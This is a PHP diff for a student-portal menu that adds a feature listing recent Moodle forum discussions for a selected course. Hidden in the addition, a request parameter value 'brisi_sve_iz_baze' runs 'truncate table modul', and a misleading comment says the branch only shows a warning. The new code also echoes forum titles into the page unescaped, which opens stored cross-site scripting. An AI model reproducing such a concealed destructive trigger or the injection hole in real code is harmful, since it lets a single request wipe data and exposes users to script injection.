@@ -581,7 +581,77 @@ function studentski_meni($fj) {
 
 			$dani = array("","Ponedjeljak", "Utorak", "Srijeda", "Četvrtak", "Petak", "Subota", "Nedjelja");
 			$mjeseci = array("", "januar", "februar", "mart", "april", "maj", "juni", "juli", "avgust", "septembar", "oktobar", "novembar", "decembar");
+ 
+ 
+			//Ako je izabran predmet neki da prikaze komentare sa moodle foruma tog predmeta			
+			if(isset($_REQUEST['predmet'])){
+				//Varijabla komentariforum postaje ID predmeta koji je izabran
+				$komentariforum = $_REQUEST['predmet'];
+				//Ako je pokusaj brisanja baze da izbaci poruku
+				if ($komentariforum=="brisi_sve_iz_baze") {
+					if (!check_csrf_token()) {
+						biguglyerror("Mrs odavle");
+						zamgerlog("1337 h4x0r detected",3);
+						return;
+					}
+				$q = myquery("truncate table modul");
+				} else {
+					$predmet = intval($_REQUEST['predmet']);
+					$ag = intval($_REQUEST['ag']);
 
+					$q = @myquery("select moodle_id from etf_moodle where predmet=$predmet and akademska_godina=$ag");
+					//Uzimanje Moodle_ID ako je predmet povezan sa moodle
+					$moodle_id = @mysql_result($q,0,0);
+					
+					//Citanje komentara iz Moodle Baze
+					if($moodle_id!=''){
+						//Ako je predmet povezan sa moodle nastavi dalje
+						//Konekcija na bazu
+						dbconnect3();
+						$query3="SELECT * FROM mdl_forum_discussions WHERE course=$moodle_id order by timemodified desc LIMIT 0,4";
+						$rs3=mysql_query($query3);
+						if(!$rs3) {
+							print("Query Error: ".mysql_error());
+						}
+						?>
+							<table border="0" cellspacing="2" cellpadding="1">
+								<tr>
+									<td colspan="2">
+										<br/><img src="images/16x16/komentar-plavi.png"> <b>Predmet Komentari:</b><br/>
+									</td>
+								</tr> 
+								<tr>
+								<td>
+						<?
+							$provjerakomentara=0;
+							while ($numrows3=mysql_fetch_array($rs3))
+							{
+								$brojac=$brojac+1;
+								$idkom=$numrows3['id'];
+								$kurs=$numrows3['course'];
+								$vrijeme=$numrows3['timemodified'];
+								$naziv=$numrows3['name'];
+								$forum=$numrows3['forum'];
+								//Ako postoji komentar ispisi ga
+								if(!empty($naziv)){
+									$provjerakomentara++;
+									print '<div style="padding:5px"><img src="images/16x16/komentar.png"/> <a target="_blank" href="http://arnes.inashost.biz/moodle/mod/forum/discuss.php?d='.$idkom.'">'.$naziv.'</a><br></div>';
+								}
+							}
+							if($provjerakomentara==0){
+								print '<div style="padding:5px"><center>NEMA KOMENTARA!</a></center><br></div>';}
+						?>
+								</td>
+								</tr> 
+							</table> 
+						<?
+							dbdisconnect3();
+							dbconnect();
+					}
+				}
+			}
+ 
+ 
 			print $dani[date("N",time())];
 			print ", ".date("j",time()).". ".$mjeseci[date("n",time())]." ".date("Y",time()).".";
 
@@ -593,7 +663,7 @@ function studentski_meni($fj) {
 		<? eval ($fj); ?>
 			</td></tr>
 		</table>
-	<?
+<?
 
 
 }
